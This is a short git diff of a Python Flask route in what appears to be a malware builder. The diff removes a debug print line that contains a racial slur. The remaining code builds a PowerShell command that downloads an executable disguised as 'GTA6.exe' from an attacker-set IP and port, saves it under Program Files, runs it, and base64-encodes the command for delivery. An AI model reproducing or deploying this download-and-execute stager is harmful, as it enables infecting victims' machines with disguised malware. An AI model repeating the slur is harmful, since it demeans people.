@@ -66,7 +66,6 @@ def payload():
         return render_template('payload.html', string=payload_string)
     else:
         status = pytoexe()
-        print("Nigga this is the function status : ", status)
         if status:
             initial_string = rf'$url = "http://{payload_ip}:{payload_port}/build/GTA6/GTA6.exe"; $destination = "C:\Program Files\WindowsPowerShell\GTA6.exe"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
             payload_string = base64.b64encode(initial_string.encode()).decode()
